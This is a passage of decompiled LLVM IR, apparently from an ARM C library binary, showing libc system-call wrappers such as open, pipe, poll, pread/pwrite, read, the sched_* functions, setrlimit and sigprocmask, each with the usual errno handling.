  %v2_104c0 = call i32 @__libc_open(i32 %v0_104c0, i32 %v1_104b0)
  ret i32 %v2_104c0

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__libc_pause(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_104d4 = load i32, i32* @r4, align 4
  store i32 %v3_104d4, i32* %stack_var_-8, align 4
  %v0_104d8 = call i32 @pause()
  store i32 %v0_104d8, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_104d8, -4095
  br i1 %tmp, label %dec_label_pc_104f8, label %dec_label_pc_104e8

dec_label_pc_104e8:                               ; preds = %entry
  %v0_104e8 = call i32 @__errno_location()
  %v0_104ec = load i32, i32* %r4.global-to-local, align 4
  %v1_104ec = sub i32 0, %v0_104ec
  %v2_104f0 = inttoptr i32 %v0_104e8 to i32*
  store i32 %v1_104ec, i32* %v2_104f0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_104f8

dec_label_pc_104f8:                               ; preds = %entry, %dec_label_pc_104e8
  %v0_104f8 = phi i32 [ %v0_104d8, %entry ], [ -1, %dec_label_pc_104e8 ]
  %v2_104fc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_104fc, i32* %r4.global-to-local, align 4
  ret i32 %v0_104f8

; uselistorder directives
  uselistorder i32 %v0_104d8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_104f8, { 1, 0 }
}

define i32 @__GI_pipe(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10500 = load i32, i32* @r4, align 4
  store i32 %v3_10500, i32* %stack_var_-8, align 4
  %v1_10504 = insertvalue [2 x i32] undef, i32 %arg1, 0
  %v2_10504 = call i32 @pipe([2 x i32] %v1_10504)
  store i32 %v2_10504, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v2_10504, -4095
  br i1 %tmp, label %dec_label_pc_10524, label %dec_label_pc_10514

dec_label_pc_10514:                               ; preds = %entry
  %v0_10514 = call i32 @__errno_location()
  %v0_10518 = load i32, i32* %r4.global-to-local, align 4
  %v1_10518 = sub i32 0, %v0_10518
  %v2_1051c = inttoptr i32 %v0_10514 to i32*
  store i32 %v1_10518, i32* %v2_1051c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10524

dec_label_pc_10524:                               ; preds = %entry, %dec_label_pc_10514
  %v0_10524 = phi i32 [ %v2_10504, %entry ], [ -1, %dec_label_pc_10514 ]
  %v2_10528 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_10528, i32* %r4.global-to-local, align 4
  ret i32 %v0_10524

; uselistorder directives
  uselistorder i32 %v2_10504, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10524, { 1, 0 }
}

define i32 @__libc_poll(%pollfd* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1052c = load i32, i32* @r4, align 4
  store i32 %v3_1052c, i32* %stack_var_-8, align 4
  %v5_10530 = call i32 @poll(%pollfd* %arg1, i32 %arg2, i32 %arg3)
  store i32 %v5_10530, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_10530, -4095
  br i1 %tmp, label %dec_label_pc_10550, label %dec_label_pc_10540

dec_label_pc_10540:                               ; preds = %entry
  %v0_10540 = call i32 @__errno_location()
  %v0_10544 = load i32, i32* %r4.global-to-local, align 4
  %v1_10544 = sub i32 0, %v0_10544
  %v2_10548 = inttoptr i32 %v0_10540 to i32*
  store i32 %v1_10544, i32* %v2_10548, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10550

dec_label_pc_10550:                               ; preds = %entry, %dec_label_pc_10540
  %v0_10550 = phi i32 [ %v5_10530, %entry ], [ -1, %dec_label_pc_10540 ]
  %v2_10554 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_10554, i32* @r4, align 4
  ret i32 %v0_10550

; uselistorder directives
  uselistorder i32 %v5_10530, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10550, { 1, 0 }
}

define i32 @__fake_pread_write64() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %v0_10560 = load i32, i32* @r1, align 4
  store i32 %v0_10560, i32* @r6, align 4
  %v0_10564 = load i32, i32* @r3, align 4
  %v0_10568 = load i32, i32* @r2, align 4
  store i32 %v0_10568, i32* %r7.global-to-local, align 4
  %v0_10578 = load i32, i32* @r0, align 4
  store i32 %v0_10578, i32* %r8.global-to-local, align 4
  %v4_1057c = call i32 @__libc_lseek64(i32 %v0_10578, i32 0, i32 0, i32 1)
  %v3_10580 = icmp eq i32 %v4_1057c, -1
  store i32 %v4_1057c, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  br i1 %v3_10580, label %dec_label_pc_10590, label %dec_label_pc_10598

dec_label_pc_10590:                               ; preds = %entry
  br label %dec_label_pc_10598

dec_label_pc_10598:                               ; preds = %dec_label_pc_10590, %entry
  %v0_105a0 = load i32, i32* %r8.global-to-local, align 4
  %v4_105a8 = call i32 @__libc_lseek64(i32 %v0_105a0, i32 %v0_10564, i32 %tmp7, i32 0)
  %v3_105ac = icmp eq i32 %v4_105a8, -1
  br i1 %v3_105ac, label %dec_label_pc_105b4, label %dec_label_pc_105bc

dec_label_pc_105b4:                               ; preds = %dec_label_pc_10598
  %v7_105b4 = icmp eq i32 %v0_10564, -1
  br i1 %v7_105b4, label %dec_label_pc_10630, label %dec_label_pc_105bc

dec_label_pc_105bc:                               ; preds = %dec_label_pc_10598, %dec_label_pc_105b4
  %v7_105c0 = icmp eq i32 %tmp, 1
  %v0_105c8 = load i32, i32* @r6, align 4
  store i32 %v0_105c8, i32* @r1, align 4
  %v0_105cc = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_105cc, i32* @r2, align 4
  %v0_105d0 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_105d0, i32* @r0, align 4
  br i1 %v7_105c0, label %dec_label_pc_105c8, label %dec_label_pc_105dc

dec_label_pc_105c8:                               ; preds = %dec_label_pc_105bc
  %v2_105d4 = call i32 @__libc_write(i32 %v0_105d0, i32 %v0_105c8)
  br label %dec_label_pc_105ec

dec_label_pc_105dc:                               ; preds = %dec_label_pc_105bc
  %v1_105e8 = call i32 @__libc_read(i32 %v0_105d0)
  br label %dec_label_pc_105ec

dec_label_pc_105ec:                               ; preds = %dec_label_pc_105c8, %dec_label_pc_105dc
  %storemerge = phi i32 [ %v1_105e8, %dec_label_pc_105dc ], [ %v2_105d4, %dec_label_pc_105c8 ]
  store i32 %storemerge, i32* %r7.global-to-local, align 4
  %v0_105f0 = call i32 @__errno_location()
  %v0_105f4 = load i32, i32* @r4, align 4
  store i32 %v0_105f0, i32* @r6, align 4
  %v0_105fc = load i32, i32* @r5, align 4
  %v0_10600 = load i32, i32* %r8.global-to-local, align 4
  %v1_10608 = inttoptr i32 %v0_105f0 to i32*
  %v2_10608 = load i32, i32* %v1_10608, align 4
  store i32 %v2_10608, i32* @r4, align 4
  %v4_1060c = call i32 @__libc_lseek64(i32 %v0_10600, i32 %v0_105f4, i32 %v0_105fc, i32 0)
  %v3_10610 = icmp eq i32 %v4_1060c, -1
  br i1 %v3_10610, label %dec_label_pc_10618, label %dec_label_pc_10628

dec_label_pc_10618:                               ; preds = %dec_label_pc_105ec
  %v3_10618 = icmp eq i32 %v0_105f4, -1
  br i1 %v3_10618, label %dec_label_pc_10620, label %dec_label_pc_10628

dec_label_pc_10620:                               ; preds = %dec_label_pc_10618
  %v0_10620 = load i32, i32* %r7.global-to-local, align 4
  %v3_10620 = icmp eq i32 %v0_10620, -1
  br i1 %v3_10620, label %dec_label_pc_10628, label %dec_label_pc_10630

dec_label_pc_10628:                               ; preds = %dec_label_pc_10620, %dec_label_pc_10618, %dec_label_pc_105ec
  %v0_10628 = load i32, i32* @r4, align 4
  %v1_10628 = load i32, i32* @r6, align 4
  %v2_10628 = inttoptr i32 %v1_10628 to i32*
  store i32 %v0_10628, i32* %v2_10628, align 4
  %v0_10634.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_10634

dec_label_pc_10630:                               ; preds = %dec_label_pc_10620, %dec_label_pc_105b4
  store i32 -1, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_10634

dec_label_pc_10634:                               ; preds = %dec_label_pc_10628, %dec_label_pc_10630
  %v0_10634 = phi i32 [ %v0_10634.pre, %dec_label_pc_10628 ], [ -1, %dec_label_pc_10630 ]
  ret i32 %v0_10634

; uselistorder directives
  uselistorder i32* %r7.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder label %dec_label_pc_10634, { 1, 0 }
  uselistorder label %dec_label_pc_105ec, { 1, 0 }
  uselistorder label %dec_label_pc_105bc, { 1, 0 }
}

define i32 @__libc_pwrite64(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r3, align 4
  %v0_10668 = call i32 @__fake_pread_write64()
  ret i32 %v0_10668

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__libc_pread64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r3, align 4
  %v0_106a0 = call i32 @__fake_pread_write64()
  ret i32 %v0_106a0

; uselistorder directives
  uselistorder i32 ()* @__fake_pread_write64, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__fake_pread_write() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v0_106b8 = load i32, i32* @r1, align 4
  store i32 %v0_106b8, i32* @r5, align 4
  %v0_106bc = load i32, i32* @r2, align 4
  store i32 %v0_106bc, i32* %r7.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 1, i32* @r2, align 4
  %v0_106c8 = load i32, i32* @r3, align 4
  store i32 %v0_106c8, i32* @r4, align 4
  %v0_106cc = load i32, i32* @r0, align 4
  store i32 %v0_106cc, i32* @r6, align 4
  %v3_106d0 = call i32 @__GI___libc_lseek(i32 %v0_106cc, i32 0, i32 1)
  %v7_106d4 = icmp eq i32 %v3_106d0, -1
  store i32 %v3_106d0, i32* %r8.global-to-local, align 4
  br i1 %v7_106d4, label %dec_label_pc_10760, label %dec_label_pc_106e0

dec_label_pc_106e0:                               ; preds = %entry
  %v0_106e0 = load i32, i32* @r4, align 4
  store i32 %v0_106e0, i32* @r1, align 4
  %v0_106e4 = load i32, i32* @r6, align 4
  store i32 %v0_106e4, i32* @r0, align 4
  store i32 0, i32* @r2, align 4
  %v3_106ec = call i32 @__GI___libc_lseek(i32 %v0_106e4, i32 %v0_106e0, i32 0)
  %v7_106f0 = icmp eq i32 %v3_106ec, -1
  br i1 %v7_106f0, label %dec_label_pc_10760, label %dec_label_pc_106f8

dec_label_pc_106f8:                               ; preds = %dec_label_pc_106e0
  %v3_106f8 = load i32, i32* %stack_var_0, align 4
  %v7_106fc = icmp eq i32 %v3_106f8, 1
  %v0_10704 = load i32, i32* @r5, align 4
  store i32 %v0_10704, i32* @r1, align 4
  %v0_10708 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_10708, i32* @r2, align 4
  %v0_1070c = load i32, i32* @r6, align 4
  store i32 %v0_1070c, i32* @r0, align 4
  br i1 %v7_106fc, label %dec_label_pc_10704, label %dec_label_pc_10718

dec_label_pc_10704:                               ; preds = %dec_label_pc_106f8
  %v2_10710 = call i32 @__libc_write(i32 %v0_1070c, i32 %v0_10704)
  br label %dec_label_pc_10728

dec_label_pc_10718:                               ; preds = %dec_label_pc_106f8
  %v1_10724 = call i32 @__libc_read(i32 %v0_1070c)
  br label %dec_label_pc_10728

dec_label_pc_10728:                               ; preds = %dec_label_pc_10704, %dec_label_pc_10718
  %storemerge = phi i32 [ %v1_10724, %dec_label_pc_10718 ], [ %v2_10710, %dec_label_pc_10704 ]
  store i32 %storemerge, i32* @r5, align 4
  %v0_1072c = call i32 @__errno_location()
  %v0_10730 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_10730, i32* @r1, align 4
  store i32 %v0_1072c, i32* @r4, align 4
  store i32 0, i32* @r2, align 4
  %v0_1073c = load i32, i32* @r6, align 4
  store i32 %v0_1073c, i32* @r0, align 4
  %v1_10740 = inttoptr i32 %v0_1072c to i32*
  %v2_10740 = load i32, i32* %v1_10740, align 4
  store i32 %v2_10740, i32* @r6, align 4
  %v3_10744 = call i32 @__GI___libc_lseek(i32 %v0_1073c, i32 %v0_10730, i32 0)
  %v3_10748 = icmp eq i32 %v3_10744, -1
  br i1 %v3_10748, label %dec_label_pc_10750, label %dec_label_pc_10758

dec_label_pc_10750:                               ; preds = %dec_label_pc_10728
  %v0_10750 = load i32, i32* @r5, align 4
  %v3_10750 = icmp eq i32 %v0_10750, -1
  br i1 %v3_10750, label %dec_label_pc_10758, label %dec_label_pc_10760

dec_label_pc_10758:                               ; preds = %dec_label_pc_10750, %dec_label_pc_10728
  %v0_10758 = load i32, i32* @r6, align 4
  %v1_10758 = load i32, i32* @r4, align 4
  %v2_10758 = inttoptr i32 %v1_10758 to i32*
  store i32 %v0_10758, i32* %v2_10758, align 4
  %v0_10764.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_10764

dec_label_pc_10760:                               ; preds = %dec_label_pc_10750, %dec_label_pc_106e0, %entry
  br label %dec_label_pc_10764

dec_label_pc_10764:                               ; preds = %dec_label_pc_10758, %dec_label_pc_10760
  %v0_10764 = phi i32 [ %v0_10764.pre, %dec_label_pc_10758 ], [ -1, %dec_label_pc_10760 ]
  ret i32 %v0_10764

; uselistorder directives
  uselistorder i32 %v3_106d0, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__GI___libc_lseek, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_10764, { 1, 0 }
  uselistorder label %dec_label_pc_10728, { 1, 0 }
}

define i32 @__libc_pwrite(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_1077c = call i32 @__fake_pread_write()
  ret i32 %v0_1077c
}

define i32 @__libc_pread(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_10798 = call i32 @__fake_pread_write()
  ret i32 %v0_10798

; uselistorder directives
  uselistorder i32 ()* @__fake_pread_write, { 1, 0 }
}

define i32 @__libc_read(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_107a4 = load i32, i32* @r4, align 4
  store i32 %v3_107a4, i32* %stack_var_-8, align 4
  %v0_107a8 = call i32 @read()
  store i32 %v0_107a8, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_107a8, -4095
  br i1 %tmp, label %dec_label_pc_107c8, label %dec_label_pc_107b8

dec_label_pc_107b8:                               ; preds = %entry
  %v0_107b8 = call i32 @__errno_location()
  %v0_107bc = load i32, i32* %r4.global-to-local, align 4
  %v1_107bc = sub i32 0, %v0_107bc
  %v2_107c0 = inttoptr i32 %v0_107b8 to i32*
  store i32 %v1_107bc, i32* %v2_107c0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_107c8

dec_label_pc_107c8:                               ; preds = %entry, %dec_label_pc_107b8
  %v0_107c8 = phi i32 [ %v0_107a8, %entry ], [ -1, %dec_label_pc_107b8 ]
  %v2_107cc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_107cc, i32* @r4, align 4
  ret i32 %v0_107c8

; uselistorder directives
  uselistorder i32 %v0_107a8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_107c8, { 1, 0 }
}

define i32 @sched_get_priority_max() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_107d0 = load i32, i32* @r4, align 4
  store i32 %v3_107d0, i32* %stack_var_-8, align 4
  %v0_107d4 = call i32 @sched_get_priority_max()
  store i32 %v0_107d4, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_107d4, -4095
  br i1 %tmp, label %dec_label_pc_107f4, label %dec_label_pc_107e4

dec_label_pc_107e4:                               ; preds = %entry
  %v0_107e4 = call i32 @__errno_location()
  %v0_107e8 = load i32, i32* %r4.global-to-local, align 4
  %v1_107e8 = sub i32 0, %v0_107e8
  %v2_107ec = inttoptr i32 %v0_107e4 to i32*
  store i32 %v1_107e8, i32* %v2_107ec, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_107f4

dec_label_pc_107f4:                               ; preds = %entry, %dec_label_pc_107e4
  %v0_107f4 = phi i32 [ %v0_107d4, %entry ], [ -1, %dec_label_pc_107e4 ]
  %v2_107f8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_107f8, i32* @r4, align 4
  ret i32 %v0_107f4

; uselistorder directives
  uselistorder i32 %v0_107d4, { 1, 0, 2 }
  uselistorder i32 ()* @sched_get_priority_max, { 2, 1, 0 }
  uselistorder label %dec_label_pc_107f4, { 1, 0 }
}

define i32 @sched_get_priority_min() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_107fc = load i32, i32* @r4, align 4
  store i32 %v3_107fc, i32* %stack_var_-8, align 4
  %v0_10800 = call i32 @sched_get_priority_min()
  store i32 %v0_10800, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10800, -4095
  br i1 %tmp, label %dec_label_pc_10820, label %dec_label_pc_10810

dec_label_pc_10810:                               ; preds = %entry
  %v0_10810 = call i32 @__errno_location()
  %v0_10814 = load i32, i32* %r4.global-to-local, align 4
  %v1_10814 = sub i32 0, %v0_10814
  %v2_10818 = inttoptr i32 %v0_10810 to i32*
  store i32 %v1_10814, i32* %v2_10818, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10820

dec_label_pc_10820:                               ; preds = %entry, %dec_label_pc_10810
  %v0_10820 = phi i32 [ %v0_10800, %entry ], [ -1, %dec_label_pc_10810 ]
  %v2_10824 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_10824, i32* @r4, align 4
  ret i32 %v0_10820

; uselistorder directives
  uselistorder i32 %v0_10800, { 1, 0, 2 }
  uselistorder i32 ()* @sched_get_priority_min, { 1, 0 }
  uselistorder label %dec_label_pc_10820, { 1, 0 }
}

define i32 @sched_getparam() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10828 = load i32, i32* @r4, align 4
  store i32 %v3_10828, i32* %stack_var_-8, align 4
  %v0_1082c = call i32 @sched_getparam()
  store i32 %v0_1082c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1082c, -4095
  br i1 %tmp, label %dec_label_pc_1084c, label %dec_label_pc_1083c

dec_label_pc_1083c:                               ; preds = %entry
  %v0_1083c = call i32 @__errno_location()
  %v0_10840 = load i32, i32* %r4.global-to-local, align 4
  %v1_10840 = sub i32 0, %v0_10840
  %v2_10844 = inttoptr i32 %v0_1083c to i32*
  store i32 %v1_10840, i32* %v2_10844, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1084c

dec_label_pc_1084c:                               ; preds = %entry, %dec_label_pc_1083c
  %v0_1084c = phi i32 [ %v0_1082c, %entry ], [ -1, %dec_label_pc_1083c ]
  %v2_10850 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_10850, i32* @r4, align 4
  ret i32 %v0_1084c

; uselistorder directives
  uselistorder i32 %v0_1082c, { 1, 0, 2 }
  uselistorder i32 ()* @sched_getparam, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1084c, { 1, 0 }
}

define i32 @sched_getscheduler() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10854 = load i32, i32* @r4, align 4
  store i32 %v3_10854, i32* %stack_var_-8, align 4
  %v0_10858 = call i32 @sched_getscheduler()
  store i32 %v0_10858, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10858, -4095
  br i1 %tmp, label %dec_label_pc_10878, label %dec_label_pc_10868

dec_label_pc_10868:                               ; preds = %entry
  %v0_10868 = call i32 @__errno_location()
  %v0_1086c = load i32, i32* %r4.global-to-local, align 4
  %v1_1086c = sub i32 0, %v0_1086c
  %v2_10870 = inttoptr i32 %v0_10868 to i32*
  store i32 %v1_1086c, i32* %v2_10870, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10878

dec_label_pc_10878:                               ; preds = %entry, %dec_label_pc_10868
  %v0_10878 = phi i32 [ %v0_10858, %entry ], [ -1, %dec_label_pc_10868 ]
  %v2_1087c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1087c, i32* @r4, align 4
  ret i32 %v0_10878

; uselistorder directives
  uselistorder i32 %v0_10858, { 1, 0, 2 }
  uselistorder i32 ()* @sched_getscheduler, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10878, { 1, 0 }
}

define i32 @sched_setscheduler() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10880 = load i32, i32* @r4, align 4
  store i32 %v3_10880, i32* %stack_var_-8, align 4
  %v0_10884 = call i32 @sched_setscheduler()
  store i32 %v0_10884, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10884, -4095
  br i1 %tmp, label %dec_label_pc_108a4, label %dec_label_pc_10894

dec_label_pc_10894:                               ; preds = %entry
  %v0_10894 = call i32 @__errno_location()
  %v0_10898 = load i32, i32* %r4.global-to-local, align 4
  %v1_10898 = sub i32 0, %v0_10898
  %v2_1089c = inttoptr i32 %v0_10894 to i32*
  store i32 %v1_10898, i32* %v2_1089c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_108a4

dec_label_pc_108a4:                               ; preds = %entry, %dec_label_pc_10894
  %v0_108a4 = phi i32 [ %v0_10884, %entry ], [ -1, %dec_label_pc_10894 ]
  %v2_108a8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_108a8, i32* @r4, align 4
  ret i32 %v0_108a4

; uselistorder directives
  uselistorder i32 %v0_10884, { 1, 0, 2 }
  uselistorder i32 ()* @sched_setscheduler, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_108a4, { 1, 0 }
}

define i32 @sched_yield() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_108ac = load i32, i32* @r4, align 4
  store i32 %v3_108ac, i32* %stack_var_-8, align 4
  %v0_108b0 = call i32 @sched_yield()
  store i32 %v0_108b0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_108b0, -4095
  br i1 %tmp, label %dec_label_pc_108d0, label %dec_label_pc_108c0

dec_label_pc_108c0:                               ; preds = %entry
  %v0_108c0 = call i32 @__errno_location()
  %v0_108c4 = load i32, i32* %r4.global-to-local, align 4
  %v1_108c4 = sub i32 0, %v0_108c4
  %v2_108c8 = inttoptr i32 %v0_108c0 to i32*
  store i32 %v1_108c4, i32* %v2_108c8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_108d0

dec_label_pc_108d0:                               ; preds = %entry, %dec_label_pc_108c0
  %v0_108d0 = phi i32 [ %v0_108b0, %entry ], [ -1, %dec_label_pc_108c0 ]
  %v2_108d4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_108d4, i32* %r4.global-to-local, align 4
  ret i32 %v0_108d0

; uselistorder directives
  uselistorder i32 %v0_108b0, { 1, 0, 2 }
  uselistorder i32 ()* @sched_yield, { 1, 0 }
  uselistorder label %dec_label_pc_108d0, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_108d8 = load i32, i32* @r4, align 4
  store i32 %v3_108d8, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_10900, label %dec_label_pc_108f0

dec_label_pc_108f0:                               ; preds = %entry
  %v0_108f0 = call i32 @__errno_location()
  %v0_108f4 = load i32, i32* %r4.global-to-local, align 4
  %v1_108f4 = sub i32 0, %v0_108f4
  %v2_108f8 = inttoptr i32 %v0_108f0 to i32*
  store i32 %v1_108f4, i32* %v2_108f8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_10904.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10900

dec_label_pc_10900:                               ; preds = %entry, %dec_label_pc_108f0
  %v2_10904 = phi i32 [ %v3_108d8, %entry ], [ %v2_10904.pre, %dec_label_pc_108f0 ]
  %v0_10900 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_108f0 ]
  store i32 %v2_10904, i32* @r4, align 4
  ret i32 %v0_10900

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10900, { 1, 0 }
}

define i32 @__GI_setrlimit(i32 %arg1, %rlimit* %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10908 = load i32, i32* @r4, align 4
  store i32 %v3_10908, i32* %stack_var_-8, align 4
  %v4_1090c = call i32 @setrlimit(i32 %arg1, %rlimit* %arg2)
  store i32 %v4_1090c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_1090c, -4095
  br i1 %tmp, label %dec_label_pc_1092c, label %dec_label_pc_1091c

dec_label_pc_1091c:                               ; preds = %entry
  %v0_1091c = call i32 @__errno_location()
  %v0_10920 = load i32, i32* %r4.global-to-local, align 4
  %v1_10920 = sub i32 0, %v0_10920
  %v2_10924 = inttoptr i32 %v0_1091c to i32*
  store i32 %v1_10920, i32* %v2_10924, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1092c

dec_label_pc_1092c:                               ; preds = %entry, %dec_label_pc_1091c
  %v0_1092c = phi i32 [ %v4_1090c, %entry ], [ -1, %dec_label_pc_1091c ]
  %v2_10930 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_10930, i32* %r4.global-to-local, align 4
  ret i32 %v0_1092c

; uselistorder directives
  uselistorder i32 %v4_1090c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1092c, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  %stack_var_-8 = alloca i32, align 4
  %v3_10934 = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  br i1 %v3_10934, label %.thread, label %bb

.thread:                                          ; preds = %entry
  %v3_1093c5 = load i32, i32* @r4, align 4
  store i32 %v3_1093c5, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1095c

bb:                                               ; preds = %entry
  %v3_1093c = load i32, i32* @r4, align 4
  store i32 %v3_1093c, i32* %stack_var_-8, align 4
  %tmp12 = icmp ult i32 %arg1, 3
  br i1 %tmp12, label %dec_label_pc_1095c, label %dec_label_pc_10948

dec_label_pc_10948:                               ; preds = %bb
  %v0_10948 = call i32 @__errno_location()
  store i32 -1, i32* @r2, align 4
  %v2_10954 = inttoptr i32 %v0_10948 to i32*
  store i32 22, i32* %v2_10954, align 4
  %v0_10980.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_10980

dec_label_pc_1095c:                               ; preds = %.thread, %bb
  %v7_1095c = call i32 @sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp)
  store i32 %v7_1095c, i32* %r4.global-to-local, align 4
  %tmp13 = icmp ult i32 %v7_1095c, -4095
  br i1 %tmp13, label %dec_label_pc_1097c, label %dec_label_pc_1096c

dec_label_pc_1096c:                               ; preds = %dec_label_pc_1095c
  %v0_1096c = call i32 @__errno_location()
  %v0_10970 = load i32, i32* %r4.global-to-local, align 4
  %v1_10970 = sub i32 0, %v0_10970
  %v2_10974 = inttoptr i32 %v0_1096c to i32*
  store i32 %v1_10970, i32* %v2_10974, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1097c

dec_label_pc_1097c:                               ; preds = %dec_label_pc_1095c, %dec_label_pc_1096c
  %v0_1097c = phi i32 [ %v7_1095c, %dec_label_pc_1095c ], [ -1, %dec_label_pc_1096c ]
  br label %dec_label_pc_10980

dec_label_pc_10980:                               ; preds = %dec_label_pc_10948, %dec_label_pc_1097c
  %v0_10980 = phi i32 [ %v0_10980.pre, %dec_label_pc_10948 ], [ %v0_1097c, %dec_label_pc_1097c ]
  %v2_10984 = load i32, i32* %stack_var_-8, align 4
